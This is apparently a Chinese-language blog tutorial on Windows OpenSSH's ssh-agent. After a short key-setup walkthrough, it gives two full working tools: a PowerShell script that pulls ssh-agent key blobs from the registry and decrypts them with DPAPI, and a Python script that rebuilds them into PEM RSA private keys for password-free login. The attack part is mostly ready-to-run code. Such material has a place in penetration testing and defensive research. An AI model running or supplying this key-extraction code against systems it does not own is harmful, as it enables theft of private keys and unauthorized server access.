**一、ssh-agent介绍**

ssh-agent是ssh代理程序，使用ssh-agent可以方面管理私钥。  
ssh-agent主要使用在如下两个场景：  
1.使用不同的密钥连接不同主机，每次连接都要指定私钥;  
2.当私钥设置了密码，每次使用认证时都需要输入密码，非常麻烦。

**二、简要过程**

将原文中的过程复述一遍，

1、生成密钥对 ssh-keygen

公钥：id\_rsa.pub

3、加入私钥

![](../Images/b404d7eaecd8d90d704854b6d02e3a47.png)

  

4、在加入私钥后，在注册表中形成键值，

![](../Images/482a2263948abfe3019258fc6370c1e4.png)

  

5、将公钥导入服务器.ssh下的authorized\_keys中，

scp id\_rsa.pub root@192.168.252.128:/tmp  

cat id\_rsa.pub >> ~/.ssh/authorized\_keys

chmod 600 authorized\_keys

  

6、修改sshd\_config，将PubkeyAuthentication设为yes，采用密钥登录方式；

  

7、登录  

ssh -i id\_rsa root@192.168.252.128

![](../Images/2686bd6d7a5086217edae99eb124c491.png)

果然不需要密码。

  

**三、提取转换**

作者受老外的启发(https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/)，写了两个工具，完成工作，特找出提供给大家。  

1、使用extract\_ssh\_keys.ps1从注册表键值中提取出id\_rsa  

![](../Images/dedc7b374176a4fa4768e40964876163.png)

  

查看提取出来的id\_rsa.json内容：  

![](../Images/a661bebad7e22f2a29a6a8cf0a25a962.png)

  

extract\_ssh\_keys.ps1：

$path = "HKCU:\\Software\\OpenSSH\\Agent\\Keys\\"

  

$regkeys = Get-ChildItem $path | Get-ItemProperty

  

if ($regkeys.Length -eq 0) {

    Write-Host "No keys in registry"

    exit

}

  

$keys = @()

  

Add-Type -AssemblyName System.Security;

  

$regkeys | ForEach-Object {

    $key = @{}

    $comment = \[System.Text.Encoding\]::ASCII.GetString($\_.comment)

    Write-Host "Pulling key: " $comment

    $encdata = $\_.'(default)'

    $decdata = \[Security.Cryptography.ProtectedData\]::Unprotect($encdata, $null, 'CurrentUser')

    $b64key = \[System.Convert\]::ToBase64String($decdata)

    $key\[$comment\] = $b64key

    $keys += $key

}

  

ConvertTo-Json -InputObject $keys | Out-File -FilePath './extracted\_keyblobs.json' -Encoding ascii

Write-Host "extracted\_keyblobs.json written. Use Python script to reconstruct private keys: python extractPrivateKeys.py extracted\_keyblobs.json"

  

2、使用extractPrivateKeys.py从json的base64数据中转换出私钥

![](../Images/a635f468640f6436ea0702b9a66cd2b1.png)

将这个复制进id\_rsa，就形成了私钥，完成可以免密登录；

至此，完成了从ssh-agent中提取私钥的工作。

  

  

extractPrivateKeys.py：

#!/usr/bin/env python

  

import sys

import base64

import json

try:

    from pyasn1.type import univ

    from pyasn1.codec.der import encoder

except ImportError:

    print("You must install pyasn1")

    sys.exit(0)

  

def extractRSAKey(data):

    keybytes = base64.b64decode(data)

    offset = keybytes.find(b"ssh-rsa")

    if not offset:

        print("\[!\] No valid RSA key found")

        return None

    keybytes = keybytes\[offset:\]

  

    # This code is re-implemented code originally written by soleblaze in sshkey-grab

    start = 10

    size = getInt(keybytes\[start:(start+2)\])

    # size = unpack\_bigint(keybytes\[start:(start+2)\])

    start += 2

    n = getInt(keybytes\[start:(start+size)\])

    start = start + size + 2

    size = getInt(keybytes\[start:(start+2)\])

    start += 2

    e = getInt(keybytes\[start:(start+size)\])

    start = start + size + 2

    size = getInt(keybytes\[start:(start+2)\])

    start += 2

    d = getInt(keybytes\[start:(start+size)\])

    start = start + size + 2

    size = getInt(keybytes\[start:(start+2)\])

    start += 2

    c = getInt(keybytes\[start:(start+size)\])

    start = start + size + 2

    size = getInt(keybytes\[start:(start+2)\])

    start += 2

    p = getInt(keybytes\[start:(start+size)\])

    start = start + size + 2

    size = getInt(keybytes\[start:(start+2)\])

    start += 2

    q = getInt(keybytes\[start:(start+size)\])

  

    e1 = d % (p - 1)

    e2 = d % (q - 1)

  

    keybytes = keybytes\[start+size:\]

  

    seq = (

        univ.Integer(0),

        univ.Integer(n),

        univ.Integer(e),

        univ.Integer(d),

        univ.Integer(p),

        univ.Integer(q),

        univ.Integer(e1),

        univ.Integer(e2),

        univ.Integer(c),

    )

  

    struct = univ.Sequence()

  

    for i in range(len(seq)):

        struct.setComponentByPosition(i, seq\[i\])

    

    raw = encoder.encode(struct)

    data = base64.b64encode(raw).decode('utf-8')

  

    width = 64

    chopped = \[data\[i:i + width\] for i in range(0, len(data), width)\]

    top = "-----BEGIN RSA PRIVATE KEY-----\\n"

    content = "\\n".join(chopped)

    bottom = "\\n-----END RSA PRIVATE KEY-----"

    return top+content+bottom

  

def getInt(buf):

    return int.from\_bytes(buf, byteorder='big')

  

def run(filename):

    with open(filename, 'r') as fp:

        keysdata = json.loads(fp.read())

    

    for jkey in keysdata:

        for keycomment, data in jkey.items():

            privatekey = extractRSAKey(data)

            print("\[+\] Key Comment: {}".format(keycomment))

            print(privatekey)

            print()

    

    sys.exit(0)

  

if \_\_name\_\_ == '\_\_main\_\_':

    if len(sys.argv) != 2:

        print("Usage: {} extracted\_keyblobs.json".format(sys.argv\[0\]))

        sys.exit(0)

    filename = sys.argv\[1\]

    run(filename)
